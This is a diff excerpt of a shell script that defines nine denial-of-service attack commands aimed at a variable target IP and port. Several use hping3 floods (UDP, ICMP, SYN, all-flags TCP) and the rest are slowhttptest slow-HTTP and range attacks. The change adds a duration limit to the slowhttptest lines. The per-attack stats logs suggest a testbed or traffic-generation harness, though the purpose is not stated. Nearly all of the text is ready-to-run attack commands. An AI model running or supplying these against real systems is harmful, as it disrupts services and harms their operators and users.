@@ -28,13 +28,13 @@ attack_stats_log8="/home/output/logs/"$attack_type"8_stats.log"
 attack_stats_log9="/home/output/logs/"$attack_type"9_stats.log"
 
 attack_script1="hping3 --flood --udp -p $destination_port $destination_ip"
-attack_script2="slowhttptest -c 1000 -H -g -i 10 -r 200 -u http://$destination_ip -x 24 -p 3"
-attack_script3="slowhttptest -R -g -c 1000 -a 10 -b 3000 -r 500 -t HEAD -u http://$destination_ip"
+attack_script2="slowhttptest -c 1000 -H -g -i 10 -r 200 -u http://$destination_ip -x 24 -p 3 -l $attack_duration"
+attack_script3="slowhttptest -R -g -c 1000 -a 10 -b 3000 -r 500 -t HEAD -u http://$destination_ip -l $attack_duration"
 attack_script4="hping3 --flood -1 $destination_ip"
-attack_script5="slowhttptest -c 1000 -X -g -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://$destination_ip -p 3"
+attack_script5="slowhttptest -c 1000 -X -g -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://$destination_ip -p 3 -l $attack_duration"
 attack_script6="hping3 -1 --flood -C 3 -K 3 $destination_ip"
 attack_script7="hping3 --flood -p $destination_port -S $destination_ip"
-attack_script8="slowhttptest -c 1000 -B -g -i 100 -r 200 -s 8192 -u http://$destination_ip -x 10 -p 3"
+attack_script8="slowhttptest -c 1000 -B -g -i 100 -r 200 -s 8192 -u http://$destination_ip -x 10 -p 3 -l $attack_duration"
 attack_script9="hping3 --flood -p $destination_port -F -S -P -A -U -X -Y $destination_ip"
 
 
